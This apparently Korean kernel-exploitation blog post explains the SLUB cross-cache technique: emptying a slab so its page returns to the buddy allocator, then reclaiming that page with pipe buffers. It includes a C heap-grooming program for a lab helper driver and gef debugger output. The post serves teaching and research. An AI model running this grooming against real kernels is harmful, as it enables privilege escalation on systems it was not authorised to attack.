---
title: Cross Cache Attack
date: 2026-07-10 14:46:17 +0900
categories: [kernel]
---

커널 익스플로잇에 널리 쓰이는 Cross Cache Attack에 대해 알아보도록 하자.

이전의 커널 메모리 할당 게시물과 큰 관련이 있기 때문에 보고 오자.

## 1. 개요

이 기법은 리눅스 커널의 slub 할당자에서 한 슬랩 캐시의 페이지를 완전히 비워 버디 할당자로 반환한 다음, 다른 슬랩 캐시가 이전에 비웠던 페이지를 재사용하게 만든다.

## 2. 분석 

설명하기에 앞서 cpu_partial = 2, min_partial = 4 라고 가정한다.

> 실제 cpu_partial, min_partial 값은 `cat /sys/kernel/slab/kmalloc-192/min_partial` 이런 식으로 확인이 가능하다.
{: .prompt-info}

> cpu_partial 값은 그대로 코드에 사용하면 안된다. 커널 내부에서 `nr_slabs = DIV_ROUND_UP(nr_objects * 2, oo_objects(s->oo));` 연산을 수행하기 때문이다.
즉, cpu_partial_slab의 값은 `ceil(cpu_partial * 2 / objs_per_slab)` 이다.
{: .prompt-info}

partial slab이 비워져있고, full slab에서 객체 하나를 해제한다면 그 슬랩은 percpu partial slab에 들어가게 될 것이다.

이 상태에서 또 다른 full slab에서 객체 하나를 해제하면 그 슬랩 또한 percpu partial slab에 들어가게되고, 현재 percpu partial slab에 있는 slab의 수와 cpu_partial 값이 같아진다.

또 다른 full slab에서 객체 하나를 해제하면 percpu partial slab >= cpu_partial 이 되기 
때문에 현재 percpu partial slab에 있던 slab들을 node partial slab으로 이동시킨다.
그리고 아까 들어온 slab은 percpu partial slab에 들어간다.

이 과정에서 만약 node partial slab >= min_partial 이고, node partial slab으로 이동되는 slab 중 완전히 빈 슬랩이 있다면 그 슬랩은 discard 되어 버디 할당자로 반환된다.

이 빈 슬랩에 victim object가 존재한다면 이후 공격자가 비슷한 크기를 가진 객체의 할당을 통해 victim object가 존재했던 slab을 재활용하여, 커널에 값을 쓰거나 읽어올 수 있다.


## 3. 실습

```c
#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/prctl.h>
#include <unistd.h>
#include "helper/helper.h"
#include <string.h>

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1)                                                \
      err(1, "SYSCHK(" #x ")");                                                \
    __res;                                                                     \
  })

#define print_and_wait(...) do { \
    printf(__VA_ARGS__);         \
    getchar();                   \
} while (0)

#define SLAB_MIN_PARTIAL_192    5
#define SLAB_CPU_PARTIAL_192    12
#define SLAB_OBJ_PER_SLAB_192   21

// #define SLAB_MIN_PARTIAL_256    5
// #define SLAB_CPU_PARTIAL_256    13
// #define SLAB_OBJ_PER_SLAB_256   16

/*
 * Glue macros for auto-calculation
 */
#define _SLAB_MIN_PARTIAL(sz)   SLAB_MIN_PARTIAL_##sz
#define _SLAB_CPU_PARTIAL(sz)   SLAB_CPU_PARTIAL_##sz
#define _SLAB_OBJ_PER_SLAB(sz)  SLAB_OBJ_PER_SLAB_##sz

#define SLAB_MIN_PARTIAL(sz)    _SLAB_MIN_PARTIAL(sz)
#define SLAB_CPU_PARTIAL(sz)    _SLAB_CPU_PARTIAL(sz)
#define SLAB_OBJ_PER_SLAB(sz)   _SLAB_OBJ_PER_SLAB(sz)
#define SLAB_NUM_POP_NODE_OBJS(sz)                                      \
    ((((SLAB_MIN_PARTIAL(sz) + SLAB_CPU_PARTIAL(sz) - 1) /              \
       SLAB_CPU_PARTIAL(sz)) * SLAB_CPU_PARTIAL(sz)) *                  \
     SLAB_OBJ_PER_SLAB(sz))
#define SLAB_NUM_POP_CPU_OBJS(sz)                                       \
    (SLAB_CPU_PARTIAL(sz) * SLAB_OBJ_PER_SLAB(sz))
#define SLAB_NUM_ENCLOSING_OBJS(sz)                                     \
	(2 * SLAB_OBJ_PER_SLAB(sz))
    // (2 * SLAB_OBJ_PER_SLAB(sz) - 1)
#define SLAB_NUM_SLUBSTICK_OBJS(sz)                                     \
    (SLAB_OBJ_PER_SLAB(sz) + 2)
#define SLAB_NUM_HOLE_OBJS(sz)                                          \
    (1 + SLAB_NUM_SLUBSTICK_OBJS(sz) + SLAB_OBJ_PER_SLAB(sz))
#define SLAB_NUM_DEFRAG_OBJS(sz)                                        \
    (SLAB_OBJ_PER_SLAB(sz) * (SLAB_CPU_PARTIAL(sz) + SLAB_MIN_PARTIAL(sz) + 1))
#define SLAB_NUM_RECLAIM_OBJS(sz)                                       \
    (SLAB_OBJ_PER_SLAB(sz) * 6)

void pin_to_cpu(int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  SYSCHK(sched_setaffinity(0, sizeof(cset), &cset));
}

static int helper_fd = -1;

static void helper_open(void)
{
	helper_fd = SYSCHK(open("/dev/helper", O_RDWR));
}

static void *helper_alloc(uint64_t size, int verbose)
{
	struct helper_arg arg = { .size = size };
	SYSCHK(ioctl(helper_fd, HELPER_ALLOC, &arg));
	if (verbose)
		printf("[+] alloc(%lu) => 0x%llx\n", size, arg.ptr);
	return (void *)arg.ptr;
}

static void helper_free(void *ptr, int verbose)
{
	if (ptr == 0) {
		printf("[+] free(NULL)\n");
		return;
	}
	struct helper_arg arg = { .ptr = (uint64_t)ptr };

	SYSCHK(ioctl(helper_fd, HELPER_FREE, &arg));
	if (verbose)
		printf("[+] free(0x%llx)\n", (uint64_t)ptr);
}

int main(void)
{
	pin_to_cpu(1);
	helper_open();

	void *node[SLAB_NUM_POP_NODE_OBJS(192)] = {0};
	void *cpu_partial[SLAB_NUM_POP_CPU_OBJS(192)] = {0};
	void *enclosing[SLAB_NUM_ENCLOSING_OBJS(192)] = {0};
	void *vuln_obj;

	printf("[*] SLAB_NUM_POP_NODE_OBJS(192) = %d\n", SLAB_NUM_POP_NODE_OBJS(192));
	printf("[*] SLAB_NUM_POP_CPU_OBJS(192) = %d\n", SLAB_NUM_POP_CPU_OBJS(192));
	printf("[*] SLAB_NUM_ENCLOSING_OBJS(192) = %d\n", SLAB_NUM_ENCLOSING_OBJS(192));

	for (int i = 0; i < SLAB_NUM_POP_NODE_OBJS(192); i++) {
		node[i] = helper_alloc(192, 0);
	}

	for (int i = 0; i < SLAB_NUM_POP_CPU_OBJS(192); i++) {
		cpu_partial[i] = helper_alloc(192, 0);
	}

	// printf("before enclosing\n");
	// int n;
	// scanf("%d", &n);
	// printf("[*] n = %d\n", n);
	// for (int i = 0; i < n; i++) {
	// 	helper_alloc(192, 0);
	// }

	printf("enclosing\n");
	int e = 0;
	#define N (SLAB_OBJ_PER_SLAB(192))
	for (e = 0; e < N - 1; e++) {
		enclosing[e] = helper_alloc(192, 0);
	}

	vuln_obj = enclosing[N - 1] = helper_alloc(192, 0);
	printf("[*] vuln_obj = %p\n", vuln_obj);

	// Alloc N more obj
	for (e = N; e < 2 * N; e++) {
		enclosing[e] = helper_alloc(192, 0);
	}
	
	for (int i = 0; i < SLAB_NUM_POP_NODE_OBJS(192); i += SLAB_OBJ_PER_SLAB(192)) {
		helper_free(node[i], 0);
	}

	for (int i = 0; i < SLAB_NUM_ENCLOSING_OBJS(192); i++) {
		helper_free(enclosing[i], 0);
	}

	print_and_wait("put cpu partial\n");
	for (int i = 0; i < SLAB_NUM_POP_CPU_OBJS(192); i += SLAB_OBJ_PER_SLAB(192)) {
		helper_free(cpu_partial[i], 0);
	}
	
	print_and_wait("cross-cache recycle\n");
	
	
	#define PAGE_SIZE 0x1000
	
	int fd[2];
	char buf[PAGE_SIZE];
	
	memset(buf, 'W', PAGE_SIZE);
	pipe(fd);
	
	write(fd[1],buf,PAGE_SIZE);
	
	print_and_wait("cross-cache reclaim\n");

	return 0;
}
```

```text
[*] vuln_obj = 0xffff8881051d69c0
put cpu partial

------------------------------------
gef> b pipe.c:513
gef> slab-contains 0xffff8881059fcf00
[+] Wait for memory scan
slab: 0xffffea0004167f00
kmem_cache: 0xffff888100041300
base: 0xffff8881059fc000
name: kmalloc-192  object_size: 0xc0 (chunk_size: 0xc0)  num_pages: 0x1
object_base: 0xffff8881059fcf00
status: freed (found object base in freelist)
```

```text
cross-cache recycle

------------------------------------

gef> slab-contains 0xffff8881059fcf00
[+] Wait for memory scan
slab: 0xffffea0004167f00
kmem_cache: 0xffffea0004050488
base: 0xffff8881059fc000
[!] This address is not managed by slab (slab_cache_name="")

gef> buddy-dump -z Normal --cpu 1

cpu: 1
  pcp_index: 0, order: 0 (0x001000 bytes), mtype: 0 (=Unmovable)
    page:0xffffea0004167f00  size:0x001000  virt:0xffff8881059fc000-0xffff8881059fd000  phys:0x00000001059fc000-0x00000001059fd000 (pcp, cpu=1)
    page:0xffffea0004050480  size:0x001000  virt:0xffff888101412000-0xffff888101413000  phys:0x0000000101412000-0x0000000101413000 (pcp, cpu=1)
    page:0xffffea0004050400  size:0x001000  virt:0xffff888101410000-0xffff888101411000  phys:0x0000000101410000-0x0000000101411000 (pcp, cpu=1)
    page:0xffffea00040503c0  size:0x001000  virt:0xffff88810140f000-0xffff888101410000  phys:0x000000010140f000-0x0000000101410000 (pcp, cpu=1)
    page:0xffffea0004050500  size:0x001000  virt:0xffff888101414000-0xffff888101415000  phys:0x0000000101414000-0x0000000101415000 (pcp, cpu=1)
    ...
```

buddy-dump에서 보면 0xffff8881059fcf00가 제일 위에 있는 페이지인

```
pcp_index: 0, order: 0 (0x001000 bytes), mtype: 0 (=Unmovable)
    page:0xffffea0004167f00  size:0x001000  virt:0xffff8881059fc000-0xffff8881059fd000  phys:0x00000001059fc000-0x00000001059fd000 (pcp, cpu=1)
```
사이에 존재한다는 것을 알 수 있다. 따라서 재할당 시 이 페이지를 사용하게 된다.


```text
cross-cache reclaim

------------------------------------

gef> tel 0xffff888103bda900

  0xffff888103bda900|+0x0000|+000: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda908|+0x0008|+001: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda910|+0x0010|+002: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda918|+0x0018|+003: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda920|+0x0020|+004: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda928|+0x0028|+005: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda930|+0x0030|+006: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda938|+0x0038|+007: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda940|+0x0040|+008: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda948|+0x0048|+009: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'
      0xffff888103bda950|+0x0050|+010: 0x5757575757575757 'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW[...]'

```
*할당이 꼬여서 해당 page가 제일 위에 있지 않은 경우가 있어서 여러번 시도해야할 수도 있다.*


bp 걸린 곳에서 buddy-dump로 아까 확인했던 페이지가 제일 위에 있는지 확인 후, ni로 call 하는 부분까지 하고, p page로 일치하는 지 확인 후 c한다.

그리고 tel로 해당 주소를 확인하면 우리가 쓴 값이 존재하는 것을 확인할 수 있다.

